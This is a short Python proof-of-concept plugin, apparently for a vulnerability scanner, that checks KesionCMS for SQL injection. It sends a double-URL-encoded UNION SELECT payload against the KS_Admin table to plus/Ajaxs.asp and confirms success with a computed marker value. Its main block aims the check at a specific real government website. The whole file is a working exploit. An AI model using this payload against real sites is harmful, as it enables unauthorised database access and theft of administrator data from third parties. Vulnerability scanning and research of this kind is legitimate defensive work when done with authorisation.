# !/usr/bin/dev python
# -*- coding:utf-8 -*-


import re
import time
import math

def assign(service, arg):
    if service == "kesioncms":
        return True, arg

def audit(args):
    payload = "plus/Ajaxs.asp?action=GetRelativeItem&Key=goingta%2525%2527%2529%2520%2575%256E%2569%256F%256E%2520%2573%2565%256C%2565%2563%2574%25201,2,6666123%252b777700%252b9%20from%20KS_Admin%2500"
    verify_url = args + payload
    code, head,res, errcode, _ = curl.curl2(verify_url)
    if code == 200 and "7443832" in res:
        security_hole(verify_url)     
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('kesioncms','http://tzb.xiaoyi.gov.cn/')[1])
